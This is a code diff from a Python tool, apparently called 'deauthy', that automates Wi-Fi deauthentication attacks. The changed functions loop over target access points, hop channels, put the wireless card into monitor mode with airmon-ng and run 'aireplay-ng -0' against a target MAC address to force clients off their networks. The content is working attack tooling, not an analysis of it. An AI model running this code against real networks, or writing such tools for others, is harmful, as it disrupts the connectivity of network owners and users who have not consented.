@@ -1,5 +1,5 @@
 from socket import if_nameindex
-from deauthy.deauthy_types import Interface, BSSID, ESSID
+from deauthy.deauthy_types import Interface, BSSID, ESSID, MAC
 from subprocess import DEVNULL, STDOUT, check_call, check_output, CalledProcessError
 import sys
 import threading
@@ -72,12 +72,12 @@ class Functs:
         except KeyError:
             raise RuntimeError("That's not a valid interface mode.")
 
-    def do_bssid_method():
+    def do_bssid_method(bssid: BSSID):
         from deauthy.storage import current_wiface
-        for bssid, channel in Config.BSSIDs.items():
-            BSSID_METHOD.deauth(bssid)
+        for b, channel in bssid.bssids.items():
+            Functs.BSSID_METHOD.deauth(b)
         try:
-            do_bssid_method()
+            Functs.do_bssid_method()
         except KeyboardInterrupt:
             Functs.switch(card=Interface(current_wiface), mode="managed")
             return
@@ -89,14 +89,14 @@ class Functs:
             out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
     class BSSID_METHOD:
-        def deauth(bSSID: BSSID):
+        def deauth(bssid: BSSID):
             """"""
             from deauthy.storage import current_wiface, target_mac
 
-            for key, value in bSSID.bssids:
-                Functs.ChannelSys.hopper()
+            for key, value in bssid.bssids.items():
+                Functs.ChannelSys.hopper(value)
                 try:
-                    out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
+                    out = check_call(["aireplay-ng", "-0", "5", "-a", key, "-c", target_mac, current_wiface], stdout=DEVNULL, stderr=STDOUT)
                 except KeyboardInterrupt:
                     Functs.switch(Interface(current_wiface), "managed")
                     return
